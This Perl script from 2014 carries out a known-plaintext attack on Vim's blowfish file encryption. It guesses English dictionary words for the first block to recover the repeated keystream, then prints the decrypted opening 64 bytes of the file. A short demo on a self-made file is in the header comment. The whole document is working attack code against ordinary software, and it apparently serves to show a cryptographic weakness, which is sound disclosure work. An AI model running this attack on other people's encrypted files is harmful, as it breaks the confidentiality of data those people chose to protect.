#!/usr/bin/perl
# David Leadbeater <dgl@dgl.cx>, 2014.
# Known plaintext attack against vimcrypt/blowfish. Bruteforce for 7/8 letter
# English words in the first 64 bytes.
#
# Demo (make sure 'words' is installed):
#   egrep '^[A-Za-z]{7}$' /usr/share/dict/words | shuf | head -20 | tr '\n' ' ' > file 
#   vim --cmd 'set cryptmethod=blowfish' -c 'set key=myGOODkey' -c w -c q file
#   perl vim-blowfish-bruteforce.pl file
#

use strict;
use constant BLOCK_LEN => 8;
use constant DICT_FILE => "/usr/share/dict/words";

my $words = read_dict(DICT_FILE);

$_ = join "", <>;
if(!/^
  VimCrypt~02! # Magic
  .{8} # Salt
  .{8} # IV (we don't need either, just ignore them)
/xsg) {
  die "Doesn't look like vimcrypt/blowfish";
}
my $start_offset = pos;

my @blocks;
for (my $i = 0; $i < 8; $i++) {
  my $block = substr($_, $start_offset + $i * BLOCK_LEN, BLOCK_LEN);
  $blocks[$i] = $block;
}

my %possible;
for my $word(sort keys %$words) {
  my $try = length $word == 7 ? "$word\n" : $word;
  my $first = $blocks[0];
  my $maybe_keystream = $try ^ $first;
  for my $i(1 .. 7) {
    my $block = $blocks[$i];
    if (($block ^ $maybe_keystream) =~ /^([A-Za-z]{7,8})/) {
      if($words->{$1}) {
        $possible{$maybe_keystream}++;
      }
    }
  }
  if ($possible{$maybe_keystream} >= 2) {
    decrypt($maybe_keystream);
    exit 0;
  }
}

exit 1;

sub decrypt {
  my($keystream) = @_;
  for my $block(@blocks) {
    print $block ^ $keystream;
  }
  print "\n";
}

sub read_dict {
  my($file) = @_;
  my %words;
  open my $fh, "<", $file or die $!;
  while(<$fh>) {
    chomp;
    # Only look at 7 and 8 character words.
    next unless /^.{7,8}$/;
    $words{$_} = 1;
  }
  return \%words;
}

